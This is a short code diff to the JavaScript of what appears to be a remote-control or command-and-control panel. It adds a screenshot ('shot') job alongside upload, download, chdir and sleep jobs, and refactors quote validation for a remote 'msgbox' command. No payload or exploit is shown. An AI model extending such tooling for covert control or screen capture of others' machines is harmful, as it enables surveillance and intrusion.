@@ -15,8 +15,8 @@ function formatBytes(bytes, decimals = 2) {
     return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
 }
 
-function isWrappedWith(s1, s2) {
-    return s1.startsWith(s2) && s1.endsWith(s2)
+function isQuoted(s) {
+    return s.startsWith('"') && s.endsWith('"')
 }
 
 // MODAL
@@ -485,12 +485,12 @@ function initTabs() {
             if (command === '') {
                 return;
             }
-            const jobTypes = ['upload', 'download', 'chdir', 'sleep'];
+            const jobTypes = ['upload', 'download', 'chdir', 'sleep', 'shot'];
             let job = {todo: '', is_done: false};
-            // TODO: maybe check individually command args length?
+
             if (command.startsWith('msgbox')) {
                 let vals = command.match(/\w+|"[^"]+"/g);
-                if (vals.length < 3 || !isWrappedWith(vals[1], '"') && !isWrappedWith(vals[2], '"')) {
+                if (vals.length < 3 || !isQuoted(vals[1]) && !isQuoted(vals[2])) {
                     terminal.error("Wrong command syntax!");
                     terminal.resume();
                     return;
